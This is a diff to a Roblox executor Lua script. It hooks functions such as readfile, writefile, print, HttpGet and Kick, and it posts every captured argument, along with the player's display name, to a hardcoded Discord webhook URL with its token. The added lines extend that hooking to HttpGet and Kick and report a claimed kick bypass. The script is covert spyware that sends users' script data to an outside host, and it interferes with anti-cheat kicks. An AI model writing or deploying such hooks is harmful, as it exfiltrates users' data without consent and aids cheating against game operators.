@@ -17,16 +17,18 @@ local http = (syn and syn.request) or http and http.request or http_request or (
 local HttpService = game:GetService("HttpService")
 local conflog = "https://discord.com/api/webhooks/1211484283731181639/rbJUNf5xMNmc2C-UrW8FN8TMSsuunkj1GFq9tqzr3DEpS_2_tNNQXEdhZc4Z1Tos8W2t"
 local user = game:GetService("Players").LocalPlayer
+local workspace = game:GetService("Workspace")
 local expfunctions = {
     writefile,
     print,
-    setclipboard,
     rconsoleerr,
     rconsolewarn,
     warn,
     error,
     isfile,
-    readfile
+    readfile,
+    game.HttpGet,
+    user.Kick
 }
 
 local function SendMessage(url,message)
@@ -53,8 +55,14 @@ for ind,var in next,expfunctions do
                 for i,v in next,args do
                     if tostring(i):find("https") or tostring(v):find("https") and tostring(i):sub(34,46) == "Turtle-Secure" or tostring(i):sub(34,45) == "Sidhsksjsjsh" or tostring(v):sub(34,46) == "Turtle-Secure" or tostring(v):sub(34,45) == "Sidhsksjsjsh" then
                         SendMessage(conflog,"Spying " .. user.DisplayName .. "\n```\n" .. i .. ". " .. v .. "\n```")
+		    elseif tostring(i):find("Kick") or tostring(v):find("Kick") or getnamecallmethod() == "Kick" then
+			SendMessage(conflog,"Spying " .. user.DisplayName .. "\n```\nSuccessfully bypassed kick method! ( Server-side & Client-side ) \n```")
 		    else
 		        SendMessage(conflog,"Spying " .. user.DisplayName .. "\n```\n" .. i .. ". " .. v .. "\n```")
+			task.spawn(function()
+				local msg = Instance.new("Message",workspace)
+				msg.Text = "Text: " .. v .. " (" .. i .. ")\nMethod: " .. tostring(getnamecallmethod() or "null")
+			end)
                     end
                 end
                 return old(...)
